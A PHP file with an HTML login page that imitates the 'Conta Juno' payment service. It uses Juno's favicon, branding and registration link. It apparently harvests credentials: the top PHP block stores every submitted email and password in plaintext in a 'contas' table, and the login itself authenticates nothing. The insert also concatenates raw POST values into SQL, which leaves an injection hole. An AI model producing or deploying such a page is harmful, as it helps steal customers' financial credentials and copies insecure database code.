<?php

  if (isset($_POST['email']) || isset($_POST['senha'])) {
    
    // if (strlen($_POST['email']) == '0') {
    //   echo "Preencha seu email"
    // } else if (strlen($_POST['senha']) == '0') {
    //     echo "Preencha sua senha"
    // } else {

    // }


  // echo $_POST['email'];
  // echo '<br>';
  // echo $_POST['senha'];

  include_once('conect.php');

  $email = $_POST['email'];
  $senha = $_POST['senha'];

  // $query = "INSERT INTO contas(email, senha) VALUES ('$email', '$senha')";

  $result = mysqli_query($conexao, "INSERT INTO contas(email, senha) VALUES ('$email', '$senha')");

  };
?>


<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <link rel="icon" href="https://juno.com.br/favicon.ico">

  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link
    href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&family=Roboto:wght@400;500;700&display=swap"
    rel="stylesheet">

  <link rel="stylesheet" href="cadastro.css">
  <title>Juno</title>
</head>

<body>
  <img class="img-grande" src="imgs-cadastro/imagem-grande.png" alt="">

  <section class="section-form">
    <div class="section-logo">
      <img class="img-logo" src="imgs-cadastro/juno-logo.png" alt="">
      <p class="texto-logo">Olá, acesse sua Conta Juno!</p>
    </div>

    <form action="cadastro.php" method="POST" class="form">
      <div class="input-box">
        <label for="email">e-mail</label>
        <input type="email" id="email" name="email" placeholder="Digite aqui seu e-mail" required>
      </div>
      <div class="input-box">
        <label for="senha">senha</label>
        <input type="password" id="senha" name="senha" placeholder="Digite aqui sua senha" required>
      </div>
      <input type="submit" class="btn-entrar" value="Entrar">

      <div class="senha-box">
        <div class="check-box">
            <input type="checkbox" id="check">
          <label for="check">Lembrar acesso</label>
        </div>
        <a href="#">Esqueci minha senha</a>
      </div>

      <footer class="footer-form">
        <p>Transforme seu negócio com a Conta Juno!</p>
        <a href="https://app.juno.com.br/#/register/data">Abrir minha conta</a>
      </footer>
    </form>
  </section>
</body>

</html>